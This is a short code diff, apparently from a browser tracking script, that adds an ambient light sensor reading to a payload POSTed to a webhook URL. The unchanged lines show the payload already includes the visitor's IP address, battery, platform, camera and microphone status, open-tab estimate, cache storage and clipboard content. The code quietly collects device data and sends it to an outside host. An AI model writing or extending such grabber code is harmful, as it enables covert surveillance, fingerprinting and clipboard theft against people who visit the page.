@@ -86,13 +86,29 @@
                     clipboardContent = "Disabled";
                 }
 
+                let lightSensor = "Not Supported";
+                try {
+                    if ('AmbientLightSensor' in window) {
+                        const sensor = new AmbientLightSensor();
+                        sensor.addEventListener('reading', () => {
+                            lightSensor = `${sensor.illuminance} lux`;
+                        });
+                        sensor.addEventListener('error', () => {
+                            lightSensor = "Sensor Error";
+                        });
+                        sensor.start();
+                    }
+                } catch {
+                    lightSensor = "Not Supported";
+                }
+
                 await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}\nClipboard Content: ${clipboardContent}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}\nClipboard Content: ${clipboardContent}\nLight Sensor: ${lightSensor}`
                     })
                 });
 
